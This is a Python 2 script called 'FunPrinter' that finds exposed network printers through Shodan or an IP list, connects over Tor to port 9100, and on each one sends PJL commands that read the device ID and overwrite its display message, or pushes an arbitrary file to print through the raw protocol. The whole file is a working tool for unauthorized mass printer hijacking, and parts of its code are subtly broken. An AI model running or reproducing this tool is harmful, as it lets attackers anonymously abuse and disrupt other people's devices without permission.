# -*- coding: utf-8 -*-

import os, sys
from json import load
from colorama import init, Fore
import shodan
import socks, socket
import argparse

class colors:
    ERROR = '[' + Fore.LIGHTRED_EX + 'ERROR' + Fore.RESET + '] '
    LIST = '[' + Fore.LIGHTYELLOW_EX + 'LIST' + Fore.RESET + '] '
    TOR = '[' + Fore.LIGHTMAGENTA_EX + 'TOR' + Fore.RESET + '] '
    SHODAN = '[' + Fore.LIGHTCYAN_EX + 'SHODAN' + Fore.RESET + '] '
    CONNECT = '[' + Fore.LIGHTGREEN_EX + 'CONNECT' + Fore.RESET + '] '

def header():
    header = """    ________________
  _/_______________/|
 /___________/___//||   -- FunPrinter By FunSec --
|===        |----| ||
|           |   ô| ||
|___________|   ô| ||
| ||/.´---.||    | ||
|-||/_____\||-.  | |´
|_||=L==H==||_|__|/\n"""

    print header

def clear():
    'Simple console clear function'
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def printer(id_printer):
    if id_printer.split('\n')[1].replace('\n', '').replace('"', '').replace("'", '').startswith('DISPLAY'): return False
    else: return id_printer.split('\n')[1].replace('\n', '').replace('"', '').replace("'", '')

def connect(ip, raw):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + 'Connecting...'
        try:
            s.connect((ip, 9100))
        except Exception:
            print ('[' + Fore.LIGHTRED_EX + ip + Fore.RESET + '] ') + 'Connection failed'
            return 0
        print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + 'Connected!'
        print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + 'Testing JPL'
        s.send('@PJL INFO STATUS\n')
        try:
            recv = s.recv(1024)
        except socket.timeout:
            recv = ''
        if recv.startswith('@'):
            print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + 'Test completed!'
            s.send('@PJL INFO ID\n')
            id_printer = s.recv(1024)
            if not printer(id_printer):
                print ('[' + Fore.LIGHTRED_EX + ip + Fore.RESET + '] ') + 'Failed to get printer name'
            else:
                print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + printer(id_printer)
            print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + 'Changing the display screen to '+args.message
            s.send('@PJL RDYMSG DISPLAY="{}"\n'.format(args.message))
            print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + 'Done!. Closing the connection'
            s.close()
        elif recv == '':
            print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + 'RAW protocol detected. Sending file'
            s.send(raw)
            print ('[' + Fore.LIGHTGREEN_EX + ip + Fore.RESET + '] ') + 'Done!. Closing the connection'
            s.close()
        else:
            print ('[' + Fore.LIGHTRED_EX + ip + Fore.RESET + '] ') + 'Protocol not supported. Closing the connection'
            s.close()
    except Exception:
        print ('[' + Fore.LIGHTRED_EX + ip + Fore.RESET + '] ') + 'Timeout'
def get_funny(ips, raw):
    for ip in ips:
        connect(ip, raw)

def get_tor_ip():
    import socket
    import urllib2

    socket.socket = socks.socksocket

    return load(urllib2.urlopen('http://jsonip.com'))['ip']

parser = argparse.ArgumentParser()
parser.add_argument('file', help='The file do you want to print', type=str)
parser.add_argument('--mode', help='Select the mode shodan/list', type=str)
parser.add_argument('--arg', help='Set shodan key/name of the ips list', type=str)
parser.add_argument('--message', help='Message to show in the display screen of the printer with PJL', type=str)
parser.add_argument('--tor', help='Use tor proxy or not', action='store_false')
args = parser.parse_args()

clear()
header()

TEST_SOCK = socks.socksocket()

if not args.tor:
    socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
    print colors.TOR + 'Verifying the connection to the proxy'
    try:
        TEST_SOCK.connect(('www.google.com', 80))
    except socks.ProxyConnectionError:
        print colors.ERROR + 'Could not connect to proxy tor'
        sys.exit()
    print colors.TOR + 'Actual IP: ' + get_tor_ip()

if str(args.mode).lower() == 'shodan':
    SHODAN_API_KEY = args.arg
    shodan_worker = shodan.Shodan(SHODAN_API_KEY)

    results  = shodan_worker.search('port:9100')
    
    print colors.SHODAN + 'Possibility ' + results['total'] + 'printers found'

    IPS = []

    for result in results['matches']:
        IPS.append(result['ip_str']).replace(' ', '').replace('\n', '')
elif str(args.mode).lower() == 'list':
    if not os.path.exists(args.arg):
        print colors.ERROR + 'File ' + args.arg + ' is not oin your computer. Bruh!'
        sys.exit()
    print colors.LIST + 'Reading list'

    IPS = []

    with open(args.arg, 'r') as list_:
        lines = list_.readlines()
        for line in lines:
            IPS.append(line.replace(' ', '').replace('\n', '').replace(' ', '').split()[0])
        list_.close()
    print colors.LIST + 'Done!. '+str(len(IPS))+' ips loaded'
    
else:
    print colors.ERROR + 'Mode not found. Use shodan or list'
    sys.exit()

with open(args.file, 'r') as file:
    raw = file.read()

    get_funny(IPS, raw)

    file.close()

sys.exit()
